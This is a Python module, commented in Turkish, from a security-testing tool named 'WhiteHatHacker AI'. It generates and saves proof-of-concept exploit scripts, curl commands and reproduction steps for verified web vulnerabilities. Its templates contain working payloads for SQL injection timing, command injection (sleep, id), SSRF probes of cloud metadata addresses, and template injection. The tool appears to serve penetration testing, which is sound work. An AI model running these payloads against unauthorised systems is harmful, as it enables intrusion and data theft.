"""
WhiteHatHacker AI — PoC (Proof of Concept) Recorder

Zafiyet kanıtlarını PoC formatında kaydeder.
cURL komutları, Python scriptleri veya HTTP raw traffic
olarak PoC oluşturur ve saklar.
"""

from __future__ import annotations

import json
import time
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, urlencode, parse_qs

from loguru import logger
from pydantic import BaseModel


class PoCRecord(BaseModel):
    """Tek bir PoC kaydı."""

    poc_id: str = ""
    finding_id: str = ""
    vulnerability_type: str = ""
    title: str = ""

    # PoC Çeşitleri
    curl_command: str = ""
    python_script: str = ""
    raw_request: str = ""
    manual_steps: list[str] = []

    # Metadata
    target: str = ""
    endpoint: str = ""
    parameter: str = ""
    payload: str = ""

    # Durum
    verified: bool = False
    verification_output: str = ""

    created_at: float = 0.0


class PoCRecorder:
    """
    PoC oluşturma ve kaydetme motoru.

    Her doğrulanmış zafiyet için:
    1. cURL komutu
    2. Python exploit scripti
    3. Ham HTTP request
    4. Manuel reproduksiyon adımları

    oluşturur ve dosya sistemine kaydeder.

    Usage:
        recorder = PoCRecorder(output_dir="output/evidence/poc")

        poc = recorder.generate_poc(
            finding=finding_obj,
            http_exchange=exchange_obj,
        )

        recorder.save_all()
    """

    def __init__(
        self,
        output_dir: str = "output/evidence/poc",
        session_id: str = "",
    ) -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.session_id = session_id or f"poc_{int(time.time())}"

        self.records: list[PoCRecord] = []

        logger.info(f"PoCRecorder initialized | output={output_dir}")

    def generate_poc(
        self,
        finding: Any,
        http_exchange: Any | None = None,
    ) -> PoCRecord:
        """
        Bulgu için tam PoC seti oluştur.

        Args:
            finding: Doğrulanmış zafiyet bulgusu
            http_exchange: İlişkili HTTP trafiği (opsiyonel)

        Returns:
            PoCRecord with all PoC variants
        """
        vuln_type = getattr(finding, "vulnerability_type", "unknown")
        endpoint = getattr(finding, "url", "") or getattr(finding, "endpoint", "")
        parameter = getattr(finding, "parameter", "")
        payload = getattr(finding, "payload", "")
        target = getattr(finding, "target", "")
        title = getattr(finding, "title", f"PoC: {vuln_type}")

        poc = PoCRecord(
            poc_id=f"poc_{int(time.time())}_{len(self.records)}",
            finding_id=getattr(finding, "finding_id", ""),
            vulnerability_type=vuln_type,
            title=title,
            target=target,
            endpoint=endpoint,
            parameter=parameter,
            payload=payload,
            created_at=time.time(),
        )

        # cURL komutu
        poc.curl_command = self._generate_curl(
            finding, http_exchange
        )

        # Python script
        poc.python_script = self._generate_python_script(
            vuln_type, endpoint, parameter, payload, http_exchange
        )

        # Raw request
        if http_exchange:
            poc.raw_request = getattr(http_exchange, "request_raw", "") or (
                http_exchange.to_raw_request()
                if hasattr(http_exchange, "to_raw_request") else ""
            )

        # Manuel adımlar
        poc.manual_steps = self._generate_manual_steps(
            vuln_type, endpoint, parameter, payload
        )

        self.records.append(poc)

        logger.debug(
            f"PoC generated | id={poc.poc_id} | type={vuln_type} | "
            f"endpoint={endpoint}"
        )

        return poc

    def _generate_curl(
        self,
        finding: Any,
        exchange: Any | None = None,
    ) -> str:
        """cURL komutu oluştur."""
        endpoint = getattr(finding, "url", "") or getattr(finding, "endpoint", "")
        parameter = getattr(finding, "parameter", "")
        payload = getattr(finding, "payload", "")

        if not endpoint:
            return "# No endpoint available for cURL command"

        # Exchange'den daha detaylı cURL
        if exchange:
            method = getattr(exchange, "method", "GET")
            headers = getattr(exchange, "request_headers", {})
            body = getattr(exchange, "request_body", "")

            parts = ["curl -v -k"]

            if method != "GET":
                parts.append(f"-X {method}")

            for key, value in headers.items():
                if key.lower() not in ("host", "content-length"):
                    # Escape single quotes
                    safe_val = value.replace("'", "'\\''")
                    parts.append(f"-H '{key}: {safe_val}'")

            if body:
                safe_body = body.replace("'", "'\\''")
                parts.append(f"-d '{safe_body}'")

            url = getattr(exchange, "url", endpoint)
            parts.append(f"'{url}'")

            return " \\\n  ".join(parts)

        # Basic cURL from finding data
        if parameter and payload:
            parsed = urlparse(endpoint)
            qs = parse_qs(parsed.query)
            qs[parameter] = [payload]
            new_query = urlencode(qs, doseq=True)
            full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            return (
                f"curl -v -k \\\n"
                f"  '{full_url}'"
            )

        return f"curl -v -k '{endpoint}'"

    def _generate_python_script(
        self,
        vuln_type: str,
        endpoint: str,
        parameter: str,
        payload: str,
        exchange: Any | None = None,
    ) -> str:
        """Python PoC scripti oluştur."""
        if not endpoint:
            return "# No endpoint available"

        method = "GET"
        headers = {}
        body = ""

        if exchange:
            method = getattr(exchange, "method", "GET")
            headers = getattr(exchange, "request_headers", {})
            body = getattr(exchange, "request_body", "")

        # Header string
        headers_str = ""
        if headers:
            filtered = {
                k: v for k, v in headers.items()
                if k.lower() not in ("host", "content-length", "connection")
            }
            if filtered:
                headers_str = f"headers = {json.dumps(filtered, indent=4)}"

        # Script template
        script = f'''#!/usr/bin/env python3
"""
PoC — {vuln_type.replace('_', ' ').title()}
Target: {endpoint}
Parameter: {parameter or 'N/A'}
Generated by WhiteHatHacker AI v2.1
"""

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "{endpoint}"
PARAMETER = "{parameter}"
PAYLOAD = """{payload}"""
'''

        if headers_str:
            script += f"\n{headers_str}\n"
        else:
            script += "\nheaders = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) WhiteHatHackerAI/2.0'}\n"

        # Vuln-type specific script body
        if vuln_type == "sql_injection":
            script += self._sqli_poc_body(method, body)
        elif vuln_type in ("xss_reflected", "xss_stored", "xss_dom"):
            script += self._xss_poc_body(method, body)
        elif vuln_type == "command_injection":
            script += self._cmdi_poc_body(method, body)
        elif vuln_type == "ssrf":
            script += self._ssrf_poc_body(method, body)
        elif vuln_type == "ssti":
            script += self._ssti_poc_body(method, body)
        else:
            script += self._generic_poc_body(method, body)

        return script

    def _sqli_poc_body(self, method: str, body: str) -> str:
        return '''
def exploit():
    """SQL Injection PoC"""
    print(f"[*] Testing SQL Injection on {TARGET}")
    print(f"[*] Parameter: {PARAMETER}")
    print(f"[*] Payload: {PAYLOAD}")
    print()

    # Normal request (baseline)
    params = {PARAMETER: "test"} if PARAMETER else {}
    baseline = requests.get(TARGET, params=params, headers=headers, verify=False, timeout=15)
    print(f"[*] Baseline: {baseline.status_code} | Length: {len(baseline.text)}")

    # Payload request
    params_payload = {PARAMETER: PAYLOAD} if PARAMETER else {}
    response = requests.get(TARGET, params=params_payload, headers=headers, verify=False, timeout=15)
    print(f"[*] Payload:  {response.status_code} | Length: {len(response.text)}")

    # Time-based check
    import time
    time_payload = f"{PAYLOAD}; WAITFOR DELAY \'0:0:5\'--" if PARAMETER else PAYLOAD
    params_time = {PARAMETER: time_payload} if PARAMETER else {}
    start = time.time()
    try:
        response_time = requests.get(TARGET, params=params_time, headers=headers, verify=False, timeout=20)
        elapsed = time.time() - start
        print(f"[*] Time-based: {elapsed:.2f}s delay")
        if elapsed > 4.5:
            print("[+] TIME-BASED SQL INJECTION CONFIRMED!")
    except requests.Timeout:
        print("[+] Request timed out — possible time-based SQLi")

    # Check for SQL error indicators
    error_indicators = ["SQL syntax", "mysql_", "pg_query", "ORA-", "SQLITE_"]
    for indicator in error_indicators:
        if indicator.lower() in response.text.lower():
            print(f"[+] SQL ERROR FOUND: {indicator}")

    print()
    print("[*] Done. Manual verification recommended.")

if __name__ == "__main__":
    exploit()
'''

    def _xss_poc_body(self, method: str, body: str) -> str:
        return '''
def exploit():
    """XSS PoC"""
    print(f"[*] Testing XSS on {TARGET}")
    print(f"[*] Parameter: {PARAMETER}")
    print(f"[*] Payload: {PAYLOAD}")
    print()

    params = {PARAMETER: PAYLOAD} if PARAMETER else {}
    response = requests.get(TARGET, params=params, headers=headers, verify=False, timeout=15)

    print(f"[*] Status: {response.status_code}")
    print(f"[*] Content-Type: {response.headers.get('Content-Type', 'N/A')}")
    print(f"[*] Content-Length: {len(response.text)}")

    # Check reflection
    if PAYLOAD in response.text:
        print(f"[+] PAYLOAD REFLECTED UNENCODED — XSS CONFIRMED!")
    elif PAYLOAD.replace("<", "&lt;").replace(">", "&gt;") in response.text:
        print(f"[-] Payload HTML-encoded (likely not exploitable)")
    else:
        print(f"[?] Payload not found in response — check manually")

    # CSP check
    csp = response.headers.get("Content-Security-Policy", "")
    if csp:
        print(f"[!] CSP Header: {csp[:100]}")
    else:
        print(f"[*] No CSP header present")

    # X-XSS-Protection
    xss_prot = response.headers.get("X-XSS-Protection", "")
    if xss_prot:
        print(f"[!] X-XSS-Protection: {xss_prot}")

    print()
    print("[*] Open in browser to verify execution.")

if __name__ == "__main__":
    exploit()
'''

    def _cmdi_poc_body(self, method: str, body: str) -> str:
        return '''
import time

def exploit():
    """Command Injection PoC"""
    print(f"[*] Testing Command Injection on {TARGET}")
    print(f"[*] Parameter: {PARAMETER}")
    print(f"[*] Payload: {PAYLOAD}")
    print()

    # Time-based verification
    sleep_payloads = [
        f"{PAYLOAD}; sleep 5",
        f"{PAYLOAD} | sleep 5",
        f"{PAYLOAD} `sleep 5`",
    ]

    for sp in sleep_payloads:
        params = {PARAMETER: sp} if PARAMETER else {}
        start = time.time()
        try:
            response = requests.get(TARGET, params=params, headers=headers, verify=False, timeout=15)
            elapsed = time.time() - start
            print(f"[*] Payload: {sp[:60]}... → {elapsed:.2f}s")
            if elapsed > 4.5:
                print(f"[+] TIME-BASED COMMAND INJECTION CONFIRMED!")
                break
        except requests.Timeout:
            print(f"[+] Timeout — possible command injection")

    # ID output check
    id_payloads = [
        f"{PAYLOAD}; id",
        f"{PAYLOAD} | id",
        f"{PAYLOAD} $(id)",
    ]

    for ip in id_payloads:
        params = {PARAMETER: ip} if PARAMETER else {}
        response = requests.get(TARGET, params=params, headers=headers, verify=False, timeout=15)
        if "uid=" in response.text:
            print(f"[+] COMMAND OUTPUT FOUND: {response.text[response.text.index('uid='):response.text.index('uid=')+50]}")
            break

    print()
    print("[*] Done. Manual verification recommended.")

if __name__ == "__main__":
    exploit()
'''

    def _ssrf_poc_body(self, method: str, body: str) -> str:
        return '''
def exploit():
    """SSRF PoC"""
    print(f"[*] Testing SSRF on {TARGET}")
    print(f"[*] Parameter: {PARAMETER}")
    print()

    ssrf_payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
        "http://[::1]/",
        "http://0x7f000001/",
    ]

    for payload in ssrf_payloads:
        params = {PARAMETER: payload} if PARAMETER else {}
        try:
            response = requests.get(TARGET, params=params, headers=headers, verify=False, timeout=10)
            print(f"[*] {payload[:50]} → {response.status_code} | {len(response.text)} bytes")

            if response.status_code == 200 and len(response.text) > 0:
                # Check for internal content
                internal_indicators = ["ami-id", "instance-id", "root:", "localhost"]
                for ind in internal_indicators:
                    if ind in response.text.lower():
                        print(f"[+] SSRF CONFIRMED — Internal content: {ind}")
        except Exception as e:
            print(f"[*] {payload[:50]} → Error: {e}")

    print()
    print("[*] For OOB verification, use Burp Collaborator or interactsh.")

if __name__ == "__main__":
    exploit()
'''

    def _ssti_poc_body(self, method: str, body: str) -> str:
        return '''
def exploit():
    """SSTI PoC"""
    print(f"[*] Testing SSTI on {TARGET}")
    print(f"[*] Parameter: {PARAMETER}")
    print()

    ssti_payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("{{7*'7'}}", "7777777"),  # Jinja2
        ("#{7*7}", "49"),  # Ruby ERB
    ]

    for payload, expected in ssti_payloads:
        params = {PARAMETER: payload} if PARAMETER else {}
        response = requests.get(TARGET, params=params, headers=headers, verify=False, timeout=10)

        found = expected in response.text
        indicator = "[+]" if found else "[-]"
        print(f"{indicator} {payload} → Expected: {expected} | Found: {found}")

        if found:
            print(f"[+] SSTI CONFIRMED with template syntax: {payload}")
            # Try to identify engine
            print(f"[*] Attempting engine identification...")
            break

    print()
    print("[*] Manual escalation to RCE recommended with caution.")

if __name__ == "__main__":
    exploit()
'''

    def _generic_poc_body(self, method: str, body: str) -> str:
        send_method = "get" if method == "GET" else "post"
        data_param = ""
        if body and method != "GET":
            data_param = f", data='''{body[:500]}'''"

        return f'''
def exploit():
    """Generic Vulnerability PoC"""
    print(f"[*] Testing on {{TARGET}}")
    print(f"[*] Parameter: {{PARAMETER}}")
    print(f"[*] Payload: {{PAYLOAD}}")
    print()

    # Baseline request
    baseline = requests.{send_method}(TARGET, headers=headers, verify=False, timeout=15)
    print(f"[*] Baseline: {{baseline.status_code}} | {{len(baseline.text)}} bytes")

    # Payload request
    params = {{PARAMETER: PAYLOAD}} if PARAMETER else {{}}
    response = requests.{send_method}(TARGET, params=params, headers=headers, verify=False, timeout=15{data_param})
    print(f"[*] Payload:  {{response.status_code}} | {{len(response.text)}} bytes")

    # Diff
    if baseline.status_code != response.status_code:
        print(f"[+] Status code changed: {{baseline.status_code}} → {{response.status_code}}")

    len_diff = abs(len(baseline.text) - len(response.text))
    if len_diff > 100:
        print(f"[+] Significant response size difference: {{len_diff}} bytes")

    if PAYLOAD in response.text:
        print(f"[+] Payload reflected in response")

    print()
    print("[*] Manual verification recommended.")

if __name__ == "__main__":
    exploit()
'''

    def _generate_manual_steps(
        self,
        vuln_type: str,
        endpoint: str,
        parameter: str,
        payload: str,
    ) -> list[str]:
        """Manuel reproduksiyon adımları oluştur."""
        steps = []

        # Prerequisites
        steps.append("Prerequisites: Web browser, Burp Suite or similar proxy tool")

        # Step 1: Navigate
        if endpoint:
            steps.append(f"Navigate to: {endpoint}")

        # Step 2: Identify parameter
        if parameter:
            steps.append(f"Identify the '{parameter}' parameter in the request")

        # Step 3: Inject payload
        if payload:
            steps.append(f"Replace the parameter value with the payload: {payload}")

        # Step 4: Type-specific observation
        observations = {
            "sql_injection": "Observe the response for SQL error messages, different content length, or time delay",
            "xss_reflected": "Check if the payload is reflected unencoded in the response. Open in browser to verify JavaScript execution",
            "xss_stored": "Submit the payload and navigate to the page where stored content is displayed. Verify JavaScript execution",
            "command_injection": "Check the response for command output (e.g., 'uid=', directory listing). For blind injection, use sleep-based payloads",
            "ssrf": "Check if the response contains content from the internal URL. Use out-of-band techniques (Burp Collaborator) for blind SSRF",
            "ssti": "Check if the mathematical expression (e.g., 7*7=49) is resolved in the response",
            "idor": "Compare responses when accessing resources with different user IDs/object references",
            "open_redirect": "Check if the browser redirects to the attacker-controlled URL",
            "cors_misconfiguration": "Send request with Origin header set to attacker domain. Check if Access-Control-Allow-Origin reflects the origin",
        }

        obs = observations.get(vuln_type, "Observe the response for signs of the vulnerability")
        steps.append(obs)

        # Step 5: Document
        steps.append("Document the finding with screenshots and HTTP traffic logs")

        return steps

    # ── Kaydetme ──────────────────────────────────────────────

    def save_all(self) -> list[str]:
        """Tüm PoC'leri dosya sistemine kaydet."""
        saved_files: list[str] = []

        for poc in self.records:
            poc_dir = self.output_dir / poc.poc_id
            poc_dir.mkdir(parents=True, exist_ok=True)

            # cURL
            if poc.curl_command:
                curl_path = poc_dir / "exploit.sh"
                content = f"#!/bin/bash\n# PoC: {poc.title}\n# Type: {poc.vulnerability_type}\n# Target: {poc.endpoint}\n\n{poc.curl_command}\n"
                curl_path.write_text(content, encoding="utf-8")
                saved_files.append(str(curl_path))

            # Python script
            if poc.python_script:
                py_path = poc_dir / "exploit.py"
                py_path.write_text(poc.python_script, encoding="utf-8")
                saved_files.append(str(py_path))

            # Raw request
            if poc.raw_request:
                raw_path = poc_dir / "request.txt"
                raw_path.write_text(poc.raw_request, encoding="utf-8")
                saved_files.append(str(raw_path))

            # Manual steps
            if poc.manual_steps:
                steps_path = poc_dir / "manual_steps.md"
                lines = [
                    f"# Manual Reproduction: {poc.title}",
                    f"**Type:** {poc.vulnerability_type}",
                    f"**Endpoint:** {poc.endpoint}",
                    "",
                    "## Steps",
                    "",
                ]
                for i, step in enumerate(poc.manual_steps, 1):
                    lines.append(f"{i}. {step}")

                steps_path.write_text("\n".join(lines), encoding="utf-8")
                saved_files.append(str(steps_path))

            # Metadata JSON
            meta_path = poc_dir / "metadata.json"
            meta_path.write_text(
                poc.model_dump_json(indent=2),
                encoding="utf-8",
            )
            saved_files.append(str(meta_path))

        logger.info(f"PoC records saved | count={len(self.records)} | files={len(saved_files)}")

        return saved_files

    def get_by_finding(self, finding_id: str) -> PoCRecord | None:
        """Finding ID'ye göre PoC getir."""
        for poc in self.records:
            if poc.finding_id == finding_id:
                return poc
        return None


__all__ = [
    "PoCRecorder",
    "PoCRecord",
]
